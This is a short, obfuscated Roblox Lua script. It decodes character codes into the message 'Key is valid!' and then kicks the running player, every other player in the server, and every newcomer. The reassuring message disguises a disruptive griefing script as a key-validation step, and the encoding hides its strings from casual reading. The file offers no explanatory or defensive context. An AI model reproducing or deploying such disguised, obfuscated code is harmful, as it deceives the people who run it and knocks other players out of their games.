local y={75,101,121,32,105,115,32,118,97,108,105,100,33}
local function z(A)local B=""for C=1,#A do B=B..string.char(A[C])end return B end
local D=function(E)return game:GetService(z({80,108,97,121,101,114,115}))end
local F=D()local G=F.LocalPlayer;if G then G:Kick(z(y))end
for H,I in pairs(F:GetPlayers())do if I~=G then pcall(function()I:Kick(z(y))end)end end
F.PlayerAdded:Connect(function(J)pcall(function()J:Kick(z(y))end)end)
